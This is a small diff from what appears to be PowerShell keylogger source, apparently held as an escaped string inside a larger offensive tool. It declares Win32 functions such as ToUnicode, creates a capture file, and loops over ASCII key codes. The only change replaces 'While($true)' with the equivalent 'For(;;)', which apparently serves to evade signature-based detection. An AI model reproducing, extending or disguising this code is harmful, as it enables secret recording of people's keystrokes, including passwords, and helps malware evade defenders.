@@ -180,7 +180,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
    `$API = Add-Type -MemberDefinition `$signatures -Name 'Win32' -Namespace API -PassThru
    `$null = Ni -Path `$Path -ItemType File -Force
    try{
-      While(`$true)
+      For(;;)
       {
          For(`$ascii = 9; `$ascii -le 128; `$ascii++) 
          {
